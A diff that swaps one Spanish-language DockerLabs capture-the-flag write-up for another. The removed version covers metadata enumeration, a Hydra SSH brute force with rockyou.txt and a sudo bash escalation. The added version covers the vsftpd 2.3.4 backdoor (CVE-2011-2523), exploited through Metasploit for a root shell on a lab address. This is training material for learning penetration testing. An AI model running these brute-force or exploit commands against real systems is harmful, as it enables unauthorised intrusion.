@@ -1,69 +1,71 @@
-# Write-up: BorazuwarahCTF (DockerLabs)
+# Write-up: FirstHacking (DockerLabs)
 
-Esta guía detalla la resolución de la máquina "BorazuwarahCTF" de la plataforma DockerLabs, clasificada como de dificultad "Muy Fácil".
+Resolución completa de la máquina **FirstHacking** de DockerLabs - Dificultad: Muy Fácil
 
-## 1. Reconocimiento e Identificación (Reconnaissance)
-Comenzamos identificando el estado de la máquina y sus puertos abiertos. La dirección IP objetivo es `172.17.0.2`.
+## 1. Reconocimiento
 
-### Escaneo de Puertos (Nmap)
+### Escaneo de Puertos
 ```bash
 nmap -sC -sV -p- 172.17.0.2
 ```
-Resultado destacado:
-*   **22/tcp**: SSH (OpenSSH 9.2p1)
-*   **80/tcp**: HTTP (Apache 2.4.59)
 
-## 2. Enumeración Web y Extracción de Datos
-Al acceder al servicio web por el puerto 80, encontramos una página simple que carga una imagen: `imagen.jpeg`.
-
-### Análisis de Metadatos (Exiftool)
-Descargamos la imagen o la analizamos directamente. Al revisar sus metadatos, encontramos información crítica:
-```bash
-exiftool imagen.jpeg
-```
-**Resultado relevante:**
-`Description: ---------- User: borazuwarah ----------`
-
-Hemos identificado un nombre de usuario potencial: **borazuwarah**.
-
-## 3. Acceso Inicial (Exploitation)
-Dado que tenemos un usuario y el puerto SSH abierto, procedemos a realizar un ataque de fuerza bruta con `Hydra` y el diccionario `rockyou.txt`.
-
-### Ataque SSH con Hydra
-```bash
-hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
-```
-**Credenciales encontradas:**
-`borazuwarah : 123456`
-
-Accedemos al sistema:
-```bash
-ssh borazuwarah@172.17.0.2
-```
-
-## 4. Escalada de Privilegios (Privilege Escalation)
-Una vez dentro como el usuario `borazuwarah`, revisamos nuestros privilegios de `sudo`.
-
-### Enumeración de Sudo
-```bash
-sudo -l
-```
 **Resultado:**
 ```
-(ALL) NOPASSWD: /bin/bash
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
 ```
 
-Esto nos indica que podemos ejecutar `/bin/bash` con permisos de root sin necesidad de contraseña.
+Solo encontramos el puerto 21 abierto ejecutando **vsftpd 2.3.4**.
 
-### Obtención de Root
-Simplemente ejecutamos:
+## 2. Análisis de Vulnerabilidades
+
+La versión **vsftpd 2.3.4** es conocida por contener una puerta trasera (backdoor) que permite ejecución remota de comandos como root.
+
+- **CVE**: CVE-2011-2523
+- **Descripción**: Backdoor en vsftpd 2.3.4
+- **Impacto**: Acceso root directo
+
+## 3. Explotación
+
+### Usando Metasploit
 ```bash
-sudo bash
+msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 172.17.0.2
+exploit
 ```
-¡Ya somos root!
 
-## 5. Conclusión
-La máquina es un excelente ejercicio introductorio. Los puntos clave fueron la enumeración de metadatos en archivos multimedia y la revisión de configuraciones de sudo inseguras.
+**Resultado:**
+```
+[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
+[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
+[*] Command shell session 1 opened
+```
+
+¡Shell obtenida como **root**!
+
+### Verificación
+```bash
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+whoami
+# root
+```
+
+## 4. Conclusión
+
+La máquina **FirstHacking** es un excelente punto de partida para aprender sobre:
+- Enumeración de servicios
+- Búsqueda de vulnerabilidades conocidas
+- Uso de Metasploit Framework
+- Explotación de backdoors
+
+**Puntos clave:**
+- ✅ Reconocimiento exhaustivo de puertos
+- ✅ Identificación de versiones vulnerables
+- ✅ Uso de exploits públicos (Metasploit)
+- ✅ Acceso root directo sin escalada de privilegios necesaria
 
 ---
-
+*Write-up por Antigravity*
